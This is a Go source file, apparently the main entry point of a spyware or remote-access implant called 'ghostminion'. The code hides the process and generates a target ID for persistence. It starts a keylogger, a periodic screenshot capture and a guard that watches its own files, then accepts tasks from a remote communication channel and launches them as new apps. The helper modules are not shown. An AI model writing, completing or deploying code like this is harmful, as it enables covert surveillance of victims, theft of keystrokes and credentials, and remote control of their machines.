package main

import (
	"ghostminion/apps"
	"ghostminion/communication"
	"ghostminion/config"
	"ghostminion/db"
	"ghostminion/hider"
	"ghostminion/logger"
	"ghostminion/persistence"
)

const (
	configFilePath = "../tests/config.yaml"
)

func main() {

	configInstance, err := config.LoadConfig(configFilePath)
	if err != nil {
		panic(err)
	}

	log := logger.GetLogger()
	defer func(log *logger.Logger) {
		_ = log.Close() //TODO: do not ignore this error
	}(log)

	hider.Hide()

	err = db.Init(configInstance.Installation.DBPath, configInstance.Installation.DBPassword)
	if err != nil {
		panic(err)
	}

	targetId := persistence.GenerateTargetID()
	err = config.UpdateConfig(configFilePath, func(c *config.Config) {
		c.AgentID = targetId
	})
	if err != nil {
		return
	}

	log.Debug("targetId: %s", targetId)

	appManager := apps.GetAppManagerInstance()
	appManager.StartApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})

	appManager.StartApp(string(apps.ScreenShotTask)+"_default", apps.NewScreenshotApp(
		configInstance.Apps.Screenshot["Interval"].(int),
		configInstance.Apps.Screenshot["Quality"].(int),
	))
	appManager.StartApp("security_guard", &apps.SecurityGuardApp{
		FilesExistence: []string{
			configInstance.Installation.DBPath,
		},
	})

	taskCh := make(chan apps.AppData)
	go communication.Routine(taskCh)
	// TODO: should be done in the task/app manager
	for task := range taskCh {
		// TODO: handle config change
		if app, err := apps.NewAppFactory(task); err != nil {
			log.Warn("could not make app from task err: %s", err.Error())
		} else {
			appManager.StartApp(task.Name, app)
		}
	}

	appManager.StopAll()
}
